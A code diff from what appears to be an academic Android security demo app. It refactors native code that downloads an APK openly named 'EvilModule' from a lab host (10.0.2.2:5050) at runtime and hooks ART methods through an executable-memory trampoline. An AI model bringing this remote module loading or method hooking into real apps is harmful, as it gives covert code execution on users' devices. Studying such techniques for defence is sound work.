@@ -31,11 +31,9 @@
 #include "Connection.h"
 #include "Downloader.h"
 #include "Util.h"
+#include "EvilModuleProvider.h"
 
 using namespace std;
-
-
-static std::string downloadEvilModule(JNIEnv *env) throw(DownloadException);
 
 
 /**
@@ -139,15 +137,14 @@ private:
 
         unsigned char* usedPayload = jniTrampoline;
         unsigned int size = sizeof(jniTrampoline);
-        LOGE("trampoline size: %i", size);
+        util::logE("EVIL_LIB::HOOK", "trampoline size: %i", size);
         void* buf = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
 
         if(buf == MAP_FAILED) {
             std::string errorMessage(strerror(errno));
             errorMessage = "mmap failed: " + errorMessage;
             const char* msg = errorMessage.c_str();
-            LOGE("mmap failed!");
-            __android_log_write(ANDROID_LOG_ERROR, LOG_TAG, msg);
+            util::logE("EVIL_LIB::HOOK", "mmap failed!");
             return NULL;
         }
 
@@ -178,7 +175,7 @@ public:
 
         // set the target method to native so that Android O wouldn't invoke it with interpreter
         int access_flags = read32((char *) targetArtMethod + artMethod.access_flags_);
-        LOGE("access flags is 0x%x", access_flags);
+        util::logE("EVIL_LIB::HOOK", "access flags is 0x%x", access_flags);
         access_flags |= kAccNative;
         memcpy((char *) this->targetArtMethod + artMethod.access_flags_, &access_flags, 4);
     }
@@ -205,63 +202,6 @@ void hook_init(JNIEnv* env) {
 
 }
 
-
-static jobject getGlobalContext(JNIEnv *env)
-{
-    jclass activityThread = env->FindClass("android/app/ActivityThread");
-    jmethodID currentActivityThread = env->GetStaticMethodID(activityThread, "currentActivityThread", "()Landroid/app/ActivityThread;");
-    jobject at = env->CallStaticObjectMethod(activityThread, currentActivityThread);
-
-    jmethodID getApplication = env->GetMethodID(activityThread, "getApplication", "()Landroid/app/Application;");
-    jobject context = env->CallObjectMethod(at, getApplication);
-    return context;
-}
-
-static jmethodID getMethod(JNIEnv* env, jobject obj, const char* methodName, const char* methodSig) {
-    jclass clazz = env->GetObjectClass(obj);
-    return env->GetMethodID(clazz, methodName, methodSig);
-}
-
-static std::string getInternalStorageDir(JNIEnv* env) {
-    jobject context = getGlobalContext(env);
-
-    jmethodID getFilesDir = getMethod(env, context, "getFilesDir", "()Ljava/io/File;");
-    jobject dirobj = env->CallObjectMethod(context, getFilesDir);
-    jmethodID getStoragePath = getMethod(env, dirobj, "getAbsolutePath", "()Ljava/lang/String;");
-    jstring path = (jstring)env->CallObjectMethod(dirobj, getStoragePath);
-    const char *pathstr=env->GetStringUTFChars(path, NULL);
-    std::string internalStorageDir(pathstr);
-    env->ReleaseStringUTFChars(path, pathstr);
-
-    LOGE("%s", internalStorageDir.c_str());
-
-    return internalStorageDir;
-}
-
-static int get(int read) {
-    if (read < 0) return 0;
-    return read;
-}
-
-static std::string downloadEvilModule(JNIEnv *env) throw(DownloadException) {
-
-    const char* serverHostName = "10.0.2.2";
-    int serverPortNumber = 5050;
-
-    string internalStorage = getInternalStorageDir(env);
-    string filePath = internalStorage + "/EvilModule.apk";
-
-
-    try{
-        Downloader downloader(serverHostName, serverPortNumber, filePath);
-        downloader.download();
-    } catch (DownloadException e) {
-        throw e;
-    }
-
-    return std::move(filePath);
-}
-
 extern "C"
 JNIEXPORT jstring
 
@@ -272,12 +212,12 @@ Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_stringFrom
     string hello = "Hello from C++";
 
     string evilModulePath;
+    EvilModuleProvider provider(Service ("10.0.2.2", 5050));
     try {
-        evilModulePath = downloadEvilModule(env);
+        evilModulePath = provider.downloadEvilModule(env);
     } catch(DownloadException e) {
-        std::stringstream ss;
-        ss << "Couldn't download evil module: Cause: " << e.what();
-        LOGE("%s", ss.str().c_str());
+        util::logE("EVIL_LIB::stringFromJNI", "Couldn't download evil module: Cause: %s", e.what());
+
     }
 
     //test();
